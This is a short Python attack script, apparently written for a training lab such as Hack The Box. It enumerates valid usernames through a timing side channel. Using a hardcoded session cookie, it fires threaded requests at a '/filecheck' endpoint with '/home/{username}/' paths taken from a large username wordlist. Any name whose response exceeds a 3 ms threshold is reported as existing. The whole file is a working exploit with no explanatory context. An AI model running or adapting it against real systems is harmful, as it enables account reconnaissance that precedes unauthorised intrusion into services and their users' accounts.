import requests
import time
from concurrent.futures import ThreadPoolExecutor

# Configurable variables
URL = "http://94.237.59.199:54069/filecheck"
cookies = {
    "session": "eyJsb2dnZWRfaW4iOnRydWUsInVzZXIiOiJodGItc3RkbnQifQ.Ztp8Xg.xsvUOrNHCjtY81jjoLclWanZ4eQ"
}
THRESHOLD_S = 0.003
WORDLIST = "./xato-net-10-million-usernames-dup.txt.1"
MAX_THREADS = 10  # Number of concurrent threads

# Function to check if username exists by replacing {pid} with the username from the wordlist
def check_username(username):
    username = username.strip()
    r = requests.get(URL, params={"filepath": f"/home/{username}/"}, cookies=cookies)

    if r.elapsed.total_seconds() > THRESHOLD_S:
        print(f"Valid username found: {username}")

# Open the wordlist and iterate over each username
with open(WORDLIST, 'r') as f:
    usernames = [username.strip() for username in f]

# Use ThreadPoolExecutor to execute check_username in parallel
with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
    executor.map(check_username, usernames)
